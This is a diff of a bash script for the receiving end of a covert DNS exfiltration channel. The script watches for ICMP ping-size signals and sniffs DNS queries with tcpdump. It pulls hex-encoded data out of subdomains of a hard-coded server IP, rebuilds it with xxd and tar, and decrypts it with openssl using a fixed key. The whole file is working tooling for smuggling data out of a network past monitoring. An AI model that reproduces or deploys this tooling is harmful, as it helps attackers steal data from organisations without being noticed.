@@ -2,8 +2,7 @@
 
 p="/root/xfil/ping.out"
 x="/root/xfil/xfil.tcp"
-svr=192.241.245.110  #192.168.181.210  192.241.245.110
-
+svr=192.241.245.110 # 168.181.210
 
 
 listen_for_signal()
@@ -15,30 +14,22 @@ listen_for_signal()
 start_catch()
 {
   echo "Starting catch..."
-  tcpdump -vvv -s 0 -l -n port 53 > $x &
-  echo "Waiting for dns xfil to complete..."
-  
-
-
-
-#  fsize=$(du -sb $x | awk '{ print $1 }')
-#  if [ $fsize -gt 10 ]; then
-#    echo caught exfil request
-#    parse_data $x
-#  fi
-
+  tcpdump -vvv -s 0 -l -n port 53 > $x&
+#  echo "Waiting for dns xfil to complete..."
 
 # waiting until DNS xfil ends....ping request from client
 
     fsize=1
+    awk '/126|136|146/' $p > $p.awk.stop
+
      until [ $fsize -gt 10 ]; do
       echo "Catching DNS xfil..."
       sleep 10
-      awk '/126|136|146/' $p > $p.awk.stop
+      awk '/126|136|146/' $p >> $p.awk.stop
       fsize=$(du -sb $p.awk.stop | awk '{ print $1 }')
-      done
- 
-     parse_data $x
+     done
+
+     parse_data
      stop_catch
 
 }
@@ -55,15 +46,15 @@ stop_catch()
 parse_signal()
 {
   echo Parsing signal file...
-  
+
   if [[ -f $p ]]; then
     awk '/86|66|96/' $p > $p.awk.start
     fsize=$(du -sb $p.awk.start | awk '{ print $1 }')
      if [ $fsize -gt 10 ]; then
       echo "Caught DNS xfil request"
-      start_catch $p 
+      start_catch
      fi
-    
+
   fi
 
 }
@@ -81,7 +72,7 @@ parse_data()
   egrep -o "[0-9a-f]*.$svr" $x | cut -d. -f1 | grep -v ^\ | uniq >> $x.hex
   xxd -r -p $x.hex > $x.gz
   tar zxvf $x.gz -O > $x.xpand
-  openssl aes-256-cbc -d -in $x.xpand -out DATA.$RANDOM -k 1234
+  openssl aes-256-cbc -d -in $x.xpand -out DATA.$(date +%j%H%M) -k 1234
 }
 
 
@@ -93,6 +84,6 @@ echo Starting....
 tcpdump -i eth0 'icmp[icmptype] = icmp-echo' -l |tee $p&
 
 while [ 1=1 ]; do
-  parse_signal $file
+  parse_signal
   sleep 10
 done
